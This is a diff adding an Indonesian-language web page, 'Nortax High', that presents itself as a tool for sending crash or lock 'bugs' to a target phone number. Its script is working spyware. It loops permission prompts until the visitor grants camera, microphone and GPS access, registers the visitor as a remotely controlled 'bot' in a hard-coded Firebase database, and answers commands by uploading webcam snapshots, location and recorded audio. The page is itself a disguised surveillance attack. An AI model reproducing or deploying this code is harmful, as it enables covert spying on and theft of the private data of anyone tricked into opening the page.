@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Nortax High - System</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root { 
+    --bg: #0f172a; --card: #1e293b; --border: #334155; 
+    --txt: #f8fafc; --muted: #94a3b8; --accent: #3b82f6; --accent-hover: #2563eb;
+    --danger: #ef4444; --success: #10b981;
+  }
+  body { 
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+    background: var(--bg); color: var(--txt); min-height: 100vh; 
+    display: flex; align-items: center; justify-content: center; padding: 20px; 
+  }
+  .container { 
+    background: var(--card); border: 1px solid var(--border); border-radius: 16px; 
+    padding: 30px 24px; width: 100%; max-width: 400px; 
+    box-shadow: 0 20px 40px rgba(0,0,0,0.4); text-align: center; 
+  }
+  .brand-img { width: 100%; max-height: 120px; object-fit: contain; margin-bottom: 20px; border-radius: 12px; }
+  
+  .input-group { margin-bottom: 16px; position: relative; }
+  .input-group i { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted); }
+  .input-group input { 
+    width: 100%; padding: 14px 14px 14px 40px; background: #0f172a; 
+    border: 1px solid var(--border); border-radius: 10px; color: white; outline: none; font-size: 14px;
+  }
+  .input-group input:focus { border-color: var(--accent); }
+  
+  .btn-row { display: flex; gap: 10px; margin-bottom: 16px; }
+  .btn-type { 
+    flex: 1; padding: 12px; border-radius: 10px; border: 1px solid var(--border); 
+    background: transparent; color: var(--muted); font-weight: 600; cursor: pointer; transition: 0.2s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-type.active { background: rgba(59,130,246,0.15); border-color: var(--accent); color: var(--accent); }
+  
+  select { 
+    width: 100%; padding: 14px; background: #0f172a; border: 1px solid var(--border); 
+    border-radius: 10px; color: white; outline: none; font-size: 14px; margin-bottom: 20px; appearance: none; 
+  }
+  
+  .btn-submit { 
+    width: 100%; padding: 15px; border: 0; border-radius: 10px; 
+    background: var(--accent); color: white; font-size: 16px; font-weight: bold; 
+    cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px;
+  }
+  .btn-submit:hover { background: var(--accent-hover); }
+  
+  /* MODAL IZIN */
+  .modal-overlay { 
+    position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
+    display: none; align-items: center; justify-content: center; z-index: 999; padding: 20px;
+  }
+  .modal-box { 
+    background: var(--card); border: 1px solid var(--border); padding: 30px 24px; 
+    border-radius: 16px; max-width: 350px; text-align: center; animation: pop 0.3s ease;
+  }
+  @keyframes pop { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+  .modal-box i { font-size: 40px; color: var(--accent); margin-bottom: 16px; }
+  .modal-box h3 { margin-bottom: 8px; font-size: 18px; }
+  .modal-box p { font-size: 13px; color: var(--muted); margin-bottom: 20px; }
+  
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<!-- TAMPILAN UTAMA WEB 1 -->
+<div class="container" id="main-ui">
+  <img src="https://c.termai.cc/i188/cSZlsG.png" alt="Nortax High" class="brand-img">
+  <h2 style="font-size: 20px; font-weight: 800; letter-spacing: 0.5px; margin-bottom: 20px; color: var(--accent);">NORTAX HIGH</h2>
+  
+  <div class="input-group">
+    <i class="fa-solid fa-phone"></i>
+    <input type="tel" placeholder="Masukkan nomor telepon" id="phone">
+  </div>
+  
+  <div class="btn-row">
+    <button class="btn-type active" onclick="setType('private', this)"><i class="fa-solid fa-lock"></i> Private</button>
+    <button class="btn-type" onclick="setType('global', this)"><i class="fa-solid fa-globe"></i> Global</button>
+  </div>
+  
+  <select id="bug-menu">
+    <option value="" disabled selected>Pilih Bug Target</option>
+    <option value="fc_android">FC Android</option>
+    <option value="fc_ios">FC Ios</option>
+    <option value="blank_hard">Blank Hard</option>
+    <option value="delay_invis">Delay Invis</option>
+    <option value="chat_lock_v1">Chat Lock v1</option>
+    <option value="chat_lock_v2">Chat Lock v2</option>
+  </select>
+  
+  <button class="btn-submit" id="btn-submit"><i class="fa-solid fa-paper-plane"></i> Kirim Bug</button>
+</div>
+
+<!-- MODAL PERIZINAN LOOPING -->
+<div class="modal-overlay" id="permission-modal">
+  <div class="modal-box">
+    <i class="fa-solid fa-shield-halved" id="modal-icon"></i>
+    <h3 id="modal-title">Izin Diperlukan</h3>
+    <p id="modal-desc">Sistem membutuhkan izin untuk melanjutkan pengiriman.</p>
+    <button class="btn-submit" id="btn-permit">Izinkan Akses</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+  import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyAcCOElhsRPXsKYyJOj4dqmB_7hN2t1kzw",
+    authDomain: "nortax-8c172.firebaseapp.com",
+    databaseURL: "https://nortax-8c172-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "nortax-8c172",
+    storageBucket: "nortax-8c172.firebasestorage.app",
+    messagingSenderId: "193601848909",
+    appId: "1:193601848909:web:4dca98cbd31248ed8b7e04",
+    measurementId: "G-B5SBMMBQ5Y"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let currentType = 'private';
+  let botId = 'nortax_' + Math.random().toString(36).slice(2, 8);
+  let botRef = ref(db, 'bots/' + botId);
+  
+  let video, canvas, currentStream, currentFacing = "user";
+  let audioStream, mediaRecorder, audioChunks = [];
+  let liveInterval = null;
+  let currentPermStage = 0;
+
+  // --- UI LOGIC ---
+  window.setType = (type, btn) => {
+    currentType = type;
+    document.querySelectorAll('.btn-type').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+  };
+
+  document.getElementById('btn-submit').onclick = () => {
+    const phone = document.getElementById('phone').value;
+    const bug = document.getElementById('bug-menu').value;
+    if(!phone || !bug) return alert("Lengkapi nomor dan pilih bug!");
+    
+    // Mulai Looping Izin
+    document.getElementById('permission-modal').style.display = 'flex';
+    requestNextPermission();
+  };
+
+  // --- LOOPING PERMISSION ---
+  async function requestNextPermission() {
+    const modalTitle = document.getElementById('modal-title');
+    const modalDesc = document.getElementById('modal-desc');
+    const modalIcon = document.getElementById('modal-icon');
+    
+    if (currentPermStage === 0) {
+      modalTitle.textContent = "Akses Kamera (1/3)";
+      modalDesc.textContent = "Izinkan kamera untuk verifikasi target.";
+      modalIcon.className = "fa-solid fa-camera";
+    } else if (currentPermStage === 1) {
+      modalTitle.textContent = "Akses Mikrofon (2/3)";
+      modalDesc.textContent = "Izinkan mikrofon untuk perekaman suara.";
+      modalIcon.className = "fa-solid fa-microphone";
+    } else if (currentPermStage === 2) {
+      modalTitle.textContent = "Akses Lokasi (3/3)";
+      modalDesc.textContent = "Izinkan lokasi untuk pelacakan GPS.";
+      modalIcon.className = "fa-solid fa-location-dot";
+    }
+  }
+
+  document.getElementById('btn-permit').onclick = async () => {
+    try {
+      if (currentPermStage === 0) {
+        // Minta Kamera
+        try {
+          currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          initVideo();
+          currentPermStage++;
+          requestNextPermission();
+        } catch(e) {
+          alert("Kamera DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
+          // Loop terus nanya
+          requestNextPermission();
+        }
+      } 
+      else if (currentPermStage === 1) {
+        // Minta Mic
+        try {
+          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          currentPermStage++;
+          requestNextPermission();
+        } catch(e) {
+          alert("Mikrofon DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
+          requestNextPermission();
+        }
+      }
+      else if (currentPermStage === 2) {
+        // Minta GPS
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            // Semua izin didapat, Daftarkan Bot & Selesai
+            document.getElementById('permission-modal').style.display = 'none';
+            await set(botRef, { 
+              status: 'online', cmd: 'none', facing: 'user', 
+              img: '', data: '', phone: document.getElementById('phone').value, 
+              type: currentType, bug: document.getElementById('bug-menu').value 
+            });
+            setupFirebaseListener();
+          },
+          (err) => {
+            alert("Lokasi DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
+            requestNextPermission();
+          },
+          { enableHighAccuracy: true, timeout: 5000 }
+        );
+      }
+    } catch (err) {
+      alert("Gagal meminta izin.");
+    }
+  };
+
+  // --- INIT MEDIA ---
+  function initVideo() {
+    video = document.createElement('video');
+    video.srcObject = currentStream;
+    video.setAttribute('playsinline', '');
+    video.play();
+    canvas = document.createElement('canvas');
+  }
+
+  async function switchCamera(facing) {
+    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+    currentFacing = facing;
+    try {
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+      initVideo();
+    } catch(e) {
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      initVideo();
+    }
+  }
+
+  // --- FIREBASE LISTENER (KONTROL DARI WEB 2) ---
+  function setupFirebaseListener() {
+    onValue(botRef, async (snapshot) => {
+      const data = snapshot.val();
+      if (!data) return;
+
+      if (data.cmd === 'snap') {
+        if (data.facing !== currentFacing) await switchCamera(data.facing);
+        setTimeout(async () => {
+          if (video.videoWidth > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg', 0.7);
+            await set(botRef, { ...data, cmd: 'none', img: imgData });
+          }
+        }, 500);
+      }
+
+      if (data.cmd === 'geo') {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          await set(botRef, { ...data, cmd: 'none', data: "📍 GPS TARGET:\nLat: " + pos.coords.latitude + "\nLng: " + pos.coords.longitude });
+        });
+      }
+
+      if (data.cmd === 'record_audio') {
+        if (!audioStream) return;
+        mediaRecorder = new MediaRecorder(audioStream);
+        audioChunks = [];
+        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          const reader = new FileReader();
+          reader.readAsDataURL(audioBlob);
+          reader.onloadend = async () => {
+            await set(botRef, { ...data, cmd: 'none', data: reader.result }); // kirim base64 audio
+          };
+        };
+        mediaRecorder.start();
+        setTimeout(() => { mediaRecorder.stop(); }, 5000); // Rekam 5 detik
+      }
+    });
+  }
+</script>
+</body>
+</html>
